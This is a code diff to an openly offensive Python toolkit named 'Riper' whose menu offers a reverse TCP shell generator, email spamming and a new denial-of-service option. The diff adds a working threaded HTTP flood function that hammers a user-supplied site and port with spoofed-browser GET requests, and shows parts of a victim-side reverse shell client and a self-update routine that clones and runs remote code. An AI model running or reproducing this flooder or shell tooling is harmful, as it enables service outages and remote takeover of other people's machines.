@@ -31,7 +31,7 @@ client.py - The program, which revieves command (The target, victim)
     sys.stdout.write(backtrack)
     print(loading + " - Made files!")
 
-    client = f"""# Made by RiperGen
+    client = f"""# Made by RiperGen0
 # RiperGen made by VERTEXX
 import os
 import socket
@@ -98,9 +98,6 @@ def send_commands(s, conn):
             sys.exit()
         except Exception as e:
             print(e)
-            conn.close()
-            e.close()
-            sys.exit()
 
 def server(address):
     try:
@@ -244,20 +241,93 @@ def update_check(v):
         os.system("git clone https://github.com/VERTEXXdev/Riper.git .")
         open("start.py", "w+").write("""import os; import time; os.system("python riper.py");""")
         os.system("python start.py")
-        quit()
+        exit()
     else:
         print("Riper is up-to-date!")
 
+def start_dos(logo, contact):
+    atts = input("Attempts to crash: ")
+    site = input("Site / IP: ")
+    port = input("Port (if empty, 80 will be chosen): ")
+    if port == "" or port == " ":
+        port = 80
+
+    try:
+        port = int(port)
+    except:
+        pass
+    import threading
+    import socket 
+    import sys,random
+    import time
+    import os
+
+    H = '\033[95m'
+    B = '\033[94m'
+    G = '\033[92m'
+    W = '\033[93m'
+    F = '\033[91m'
+    E = '\033[0m'
+    U = '\033[4m'
+    O = '\033[33m'
+    agent = []
+    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+    data = '''
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive'''
+
+    t = [None] *2000
+    a = [None] *2000
+    l = [None] *2000
+
+    def dos():
+        while 1:
+            try:
+                s = socket.socket()
+                s.connect((site, port))
+                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
+                s.sendto(packet, (site, 80))	
+                s.send(packet)
+                print("[+] Attacing server -> "+site)
+            except socket.error as e:
+                print("An error occured while trying to attack -> "+site)
+                print(e)
+            time.sleep(1)
+    def dos2():
+        while 1:
+            dos()
+
+    if True:
+        if 1:
+            for i in range(int(atts)):
+                t[i] = threading.Thread(target=dos)
+            for h in range(int(atts)):
+                l[h] = threading.Thread(target=dos2)
+            for k in range(int(atts)):
+                t[k].start()
+                l[k].start()
+    # except:
+        # main(logo, contact)
 
 
-def main(logo):
+def main(logo, contact):
     os.system("cls")
     print(logo)
     print("-----------------------------------------------------")
     print("[1] Make a reverse TCP shell [IN BETA]")
-    print("[2] Spam emails [IN BETA]")
+    print("[2] Spam emails")
+    print("[3] DOS [IN BETA]")
     
-    print("")
+    print(" ")
+
+    print("[98] Contact")
     print("[99] Exit the Riper")
 
     print("""
@@ -272,6 +342,14 @@ def main(logo):
         tcp()
     if choice == 2:
         spam_emails()
+    if choice == 3:
+        start_dos(logo, contact)
+    if choice == 98:
+        print(contact)
+        time.sleep(5)
+        main(logo, contact)
+    else:
+        main(logo, contact)
 
 # TERMS OF SERVICE
 print("""
@@ -339,4 +417,4 @@ if load_animation == True:
     sys.stdout.write(backtrack)
     print(loading + " - Going to main state...")
 
-main(logo)
+main(logo, contact)
